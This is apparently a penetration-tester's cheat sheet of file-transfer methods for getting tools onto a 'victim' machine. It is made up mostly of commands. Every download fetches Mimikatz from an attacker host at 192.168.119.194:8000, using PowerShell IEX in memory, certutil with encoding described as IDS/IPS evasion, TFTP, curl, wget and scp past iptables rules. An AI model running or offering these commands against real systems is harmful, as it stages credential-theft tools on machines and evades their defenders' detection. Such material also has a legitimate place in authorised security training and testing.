# File-Transfert-Methods

# Windows Methods

#### Powershell - Download in memory
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.194:8000/Invoke-Mimikatz.ps1')
```

#### Powershell - Download in folder
Detected by Antivirus and SIEM tools such as Varonis
```
IEX (New-Object Net.WebClient).DownloadFile("http://192.168.119.194:8000/mimikatz.exe","C:\temp\mimikatz.exe")
```

#### TFTP 
On the old Windows version sur as Windows XP, Windows 2000

On kali linux
(/tftp is a specific folder where the fille have to be put before to be uploaded on the victim. The uploaded file from the victim will be put here also)
```
atftpd --daemon --port 69 /tftp
```
On Windows
```
➤  Upload
tftp -i http://192.168.119.194:8000/ put filename
➤  Download 
tftp -i http://192.168.119.194:8000/ get filename
```

#### Certutil

Basic transfert
```
certutil.exe -urlcache -split -f http://192.168.119.194:8000/mimikatz.exe output.file
```
Encoded transfert - Basic IPS/IDS evasion
```
certutil.exe -encode mimikatz.exe mimikatz.txt
certutil.exe -urlcache -split -f "http://192.168.119.194:8000/mimikatz.txt" mimikatz.txt
certutil.exe -decode mimikatz.txt mimikatz.exe
```

# Linux Methods

#### Curl
```
curl http://192.168.119.194:8000/mimikatz.exe --output mimikatz.exe
```

#### Wget
```
wget -O mimikatz.exe http://192.168.119.194:8000/mimikatz.exe
```

#### Bypass IPtable using SCP through SSH
```
In the case of IPtable restrict the possibility to upload a file on the victim machine.
If you have a ssh connection using a id-rsa key, you could try the SCP tool to upload the file through the SSH connection.

➤ Prerequisite : Have a ssh connection (id-rsa)

➤ Error :
wget -O test.txt http://192.168.1.1:443/test.txt
--2022-03-13-- http://192.168.1.1:443:test.txt
Connecting to 192.168.1.1:443 ...

➤ Command :
root# scp -i ~/.ssh/id_rsa myfile.txt user@10.0.0.1
OR
root# scp myfile.txt user@10.0.0.1:/home/user
user@10.0.0.1's password:
```
